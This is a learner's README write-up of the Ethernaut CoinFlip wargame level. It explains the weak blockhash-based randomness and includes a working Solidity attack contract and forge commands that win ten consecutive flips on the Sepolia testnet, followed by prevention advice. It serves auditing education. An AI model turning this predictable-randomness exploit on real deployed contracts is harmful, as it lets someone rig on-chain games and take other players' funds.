# Ethernaut Level: CoinFlip - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **CoinFlip** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/coinflip/`) contains everything related to it.

**Goal:** Achieve 10 consecutive coin flip wins to set the `consecutiveWins` counter to 10.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 17, 2025 (Day 4).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
The contract is a simple game: You guess `true` (heads) or `false` (tails) in the `flip(bool _guess)` function. Randomness is generated using `blockhash(block.number - 1)`, divided by a large `FACTOR` to get 0 or 1. Correct guess increments `consecutiveWins`; incorrect resets it. It prevents repeats in the same block via `lastHash` check.

**Key Code Snippet (from src/CoinFlip/CoinFlip.sol):**
```solidity
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) { revert(); }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## Vulnerability Analysis
**Main Issue: Predictable Randomness**  
- `blockhash(block.number - 1)` fetches the previous block's hash, which is already public and known when the transaction is submitted. Thus, it's **not random**—an attacker can pre-compute it!  
- **Security Impact:** Attacker can always guess correctly, breaking game fairness. This is a classic "weak randomness" vulnerability in auditing.  
- **Audit Tip:** Avoid on-chain sources like blockhash, timestamp, or msg.sender for randomness—they're miner-manipulable. Use Chainlink VRF (Verifiable Random Function) instead.

**Example:** Assume block N-1 hash = 0x123abc.... Then `coinFlip = hash / FACTOR = 1`, so guess `true`. Attacker replicates this logic in their code!

## Solution Steps
The attack: Create a `Player` contract that computes the exact guess in its constructor using the target's logic and calls `flip()`. Each deployment triggers a win in a new block (due to lastHash check). Run the script 10 times for consecutive wins.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast` (repeat 10 times, waiting ~10s between for block confirmation).
3. **Verify:** Check `consecutiveWins()` = 10, submit on Ethernaut site.

**Key Attack Code Snippet (from src/CoinFlip/Player.sol):**
```solidity
contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlip.flip(side);  // Always correct guess!
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates wins incrementing per deployment.
- **Testnet Output Example:** Console log: `consecutiveWins: 1` (first run), then 2, ..., 10.

## Key Learnings
- **Auditing Skill:** In code reviews, scrutinize randomness sources—avoid predictable on-chain ones.
- **EVM Concept:** `blockhash()` is only valid for the last 256 blocks and is predictable.
- **Prevention:** Use off-chain oracles like Chainlink for randomness. Combining multiple sources with XOR works but isn't fully secure.
- **Next Step:** Modify the script to automate 10 runs in a loop (locally).

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/coinflip`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! 
Next level: `Telephone`. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)